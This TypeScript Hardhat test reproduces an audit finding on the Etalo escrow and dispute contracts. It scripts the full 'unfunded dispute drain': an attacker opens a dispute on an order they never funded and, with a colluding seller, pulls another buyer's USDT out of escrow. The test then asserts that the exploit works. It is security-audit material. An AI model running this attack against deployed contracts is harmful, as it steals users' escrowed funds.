/**
 * H-1 reproduction test — Unfunded Dispute Drain
 *
 * Hypothesis (from pashov solidity-auditor subagent on EtaloDispute.sol) :
 *
 *   `EtaloDispute.openDispute` (line 159-200) does not require
 *   `order.fundedAt > 0`. `EtaloEscrow.markItemDisputed` (line 789-805) /
 *   `resolveItemDispute` (line 832-918) do not either. Item state machine
 *   starts at `Pending` (not in the forbidden set at lines 797-801), so a
 *   buyer can open a dispute on an unfunded order. `resolveItemDispute`
 *   then debits the global `totalEscrowedAmount` pool and transfers USDT
 *   from the contract's actual balance — funded by other buyers' deposits.
 *
 * Exploit path tested here (N1 collusion, today, Sepolia + mainnet at deploy):
 *   1. Victim buyer creates + funds a legitimate order (USDT enters escrow custody).
 *   2. Attacker buyer creates an UNFUNDED order with a colluding seller.
 *   3. Attacker opens dispute on the unfunded item (no fundedAt check fails).
 *   4. Attacker proposes refund = item price ; colluding seller agrees.
 *   5. resolveItemDispute fires, transferring USDT from escrow custody to attacker.
 *
 * Expected outcomes :
 *   - PASS (exploit reachable) : attacker's USDT balance increases by item price ;
 *     escrow's USDT balance decreases by same amount ; victim's deposit lost.
 *   - REVERT : some guard mechanism (fundedAt check, status check, modifier)
 *     blocks one of the steps. Document which guard fires + at which line.
 *
 * Per Mike's directive : write the reproduction test only — no fix yet.
 * Result determines whether to switch into incident-response mode.
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { network } from "hardhat";
import {
  deployIntegration,
  toUSDT,
} from "../helpers/fixtures.js";

describe("H-1 — Unfunded Dispute Drain (reproduction)", async function () {
  const { viem } = await network.create();

  it("REPRO : attacker drains victim USDT via dispute on unfunded order (N1 collusion path)", async function () {
    const {
      mockUSDT,
      escrow,
      dispute,
      buyer,           // victim — funds a legitimate order
      seller,          // legitimate seller for victim's order
      seller2,         // colluding seller for attacker
      nonParty,        // attacker buyer (no USDT, no funded order)
      publicClient: _publicClient,
    } = await deployIntegration(viem);

    const ITEM_PRICE = toUSDT(100); // 100 USDT (6 decimals = 100_000_000 raw)

    // ─────────────────────────────────────────────────────────
    // Step 1 — victim creates + funds a legitimate order
    // ─────────────────────────────────────────────────────────
    // After this, escrow holds 100 USDT in custody, totalEscrowedAmount == 100
    await escrow.write.createOrderWithItems(
      [seller.account.address, [ITEM_PRICE], false], // intra-Africa, 1 item
      { account: buyer.account },
    );
    // Victim's order ID == 1, item ID == 1

    await escrow.write.fundOrder([1n], { account: buyer.account });

    const escrowBalanceAfterVictimFund = (await mockUSDT.read.balanceOf([
      escrow.address,
    ])) as bigint;
    assert.equal(
      escrowBalanceAfterVictimFund,
      ITEM_PRICE,
      "Victim funding should bring 100 USDT to escrow custody",
    );

    const victimDepositAccountedAsTotalEscrowed = (await escrow.read.totalEscrowed()) as bigint;
    assert.equal(
      victimDepositAccountedAsTotalEscrowed,
      ITEM_PRICE,
      "totalEscrowedAmount should match victim's deposit",
    );

    const attackerBalanceBefore = (await mockUSDT.read.balanceOf([
      nonParty.account.address,
    ])) as bigint;

    // ─────────────────────────────────────────────────────────
    // Step 2 — attacker creates an UNFUNDED order with colluding seller
    // ─────────────────────────────────────────────────────────
    // Attacker = nonParty. Colluding seller = seller2 (who has Tier 1 stake from fixture).
    // Attacker does NOT call fundOrder — order.fundedAt stays 0.
    await escrow.write.createOrderWithItems(
      [seller2.account.address, [ITEM_PRICE], false],
      { account: nonParty.account },
    );
    // Attacker's order ID == 2, item ID == 2

    const attackerOrder = (await escrow.read.getOrder([2n])) as {
      buyer: string;
      seller: string;
      totalAmount: bigint;
      fundedAt: bigint;
      globalStatus: number;
    };
    assert.equal(
      attackerOrder.fundedAt,
      0n,
      "Attacker order MUST be unfunded (fundedAt == 0) for the H-1 scenario",
    );

    // ─────────────────────────────────────────────────────────
    // Step 3 — attacker opens dispute on the unfunded item
    // ─────────────────────────────────────────────────────────
    // Per H-1 hypothesis : openDispute does not check order.fundedAt > 0
    // If this step reverts, the exploit is blocked → REVERT outcome.
    let openDisputeReverted: string | null = null;
    try {
      await dispute.write.openDispute([2n, 2n, "drain attempt"], {
        account: nonParty.account,
      });
    } catch (err) {
      openDisputeReverted = err instanceof Error ? err.message : String(err);
    }

    if (openDisputeReverted !== null) {
      // REVERT outcome — guard mechanism blocked openDispute on unfunded order
      console.log("\n=== H-1 RESULT : openDispute REVERTED ===");
      console.log(`Revert reason : ${openDisputeReverted}`);
      console.log("→ Guard mechanism blocks the exploit at openDispute (Step 3).");
      console.log("→ Demote H-1 from High to LEAD/Info in audit synthesis.");
      console.log("=== END H-1 RESULT ===\n");
      assert.fail(
        `H-1 REPRO test : openDispute reverted with [${openDisputeReverted}]. The exploit hypothesis is BLOCKED at Step 3. Demote H-1 in audit synthesis.`,
      );
      return;
    }

    // ─────────────────────────────────────────────────────────
    // Step 4 — attacker + colluding seller match resolveN1Amicable amounts
    // ─────────────────────────────────────────────────────────
    // dispute ID 1 (first dispute opened on this deployment)
    let resolveAttackerReverted: string | null = null;
    try {
      await dispute.write.resolveN1Amicable([1n, ITEM_PRICE], {
        account: nonParty.account,
      });
    } catch (err) {
      resolveAttackerReverted = err instanceof Error ? err.message : String(err);
    }

    let resolveSellerReverted: string | null = null;
    try {
      await dispute.write.resolveN1Amicable([1n, ITEM_PRICE], {
        account: seller2.account,
      });
    } catch (err) {
      resolveSellerReverted = err instanceof Error ? err.message : String(err);
    }

    if (resolveAttackerReverted !== null || resolveSellerReverted !== null) {
      console.log("\n=== H-1 RESULT : resolveN1Amicable REVERTED ===");
      if (resolveAttackerReverted) {
        console.log(`Attacker side reverted : ${resolveAttackerReverted}`);
      }
      if (resolveSellerReverted) {
        console.log(`Seller side reverted : ${resolveSellerReverted}`);
      }
      console.log("→ Guard mechanism blocks at resolution step.");
      console.log("=== END H-1 RESULT ===\n");
      assert.fail(
        "H-1 REPRO test : resolveN1Amicable reverted. The exploit hypothesis is BLOCKED at Step 4 (resolution). Document the guard.",
      );
      return;
    }

    // ─────────────────────────────────────────────────────────
    // Step 5 — verify exploit succeeded : USDT moved from escrow to attacker
    // ─────────────────────────────────────────────────────────
    const escrowBalanceAfterDrain = (await mockUSDT.read.balanceOf([
      escrow.address,
    ])) as bigint;
    const attackerBalanceAfterDrain = (await mockUSDT.read.balanceOf([
      nonParty.account.address,
    ])) as bigint;
    const attackerGain = attackerBalanceAfterDrain - attackerBalanceBefore;
    const escrowLoss = escrowBalanceAfterVictimFund - escrowBalanceAfterDrain;

    console.log("\n=== H-1 RESULT : EXPLOIT REACHED CONCLUSION ===");
    console.log(`Victim's deposit (Step 1)              : ${ITEM_PRICE} raw`);
    console.log(`Escrow balance after victim fund       : ${escrowBalanceAfterVictimFund} raw`);
    console.log(`Escrow balance after drain attempt     : ${escrowBalanceAfterDrain} raw`);
    console.log(`Escrow loss (drained from custody)     : ${escrowLoss} raw`);
    console.log(`Attacker balance before attack         : ${attackerBalanceBefore} raw`);
    console.log(`Attacker balance after attack          : ${attackerBalanceAfterDrain} raw`);
    console.log(`Attacker gain (USDT extracted)         : ${attackerGain} raw`);

    if (attackerGain > 0n && escrowLoss > 0n && attackerGain === escrowLoss) {
      console.log("→ H-1 CONFIRMED REACHABLE : attacker drained escrow custody.");
      console.log("→ Switch to incident-response mode.");
    } else {
      console.log("→ Unexpected state — neither full revert nor full drain.");
      console.log("→ Document precisely in test output and stop.");
    }
    console.log("=== END H-1 RESULT ===\n");

    // The test asserts the exploit IS reachable.
    // PASS == confirmed reachable (attacker gained equal to escrow loss equal to victim deposit).
    assert.equal(
      attackerGain,
      ITEM_PRICE,
      "H-1 REPRO : attacker should gain exactly the item price (drained from escrow)",
    );
    assert.equal(
      escrowLoss,
      ITEM_PRICE,
      "H-1 REPRO : escrow custody should decrease by exactly the item price",
    );
  });
});
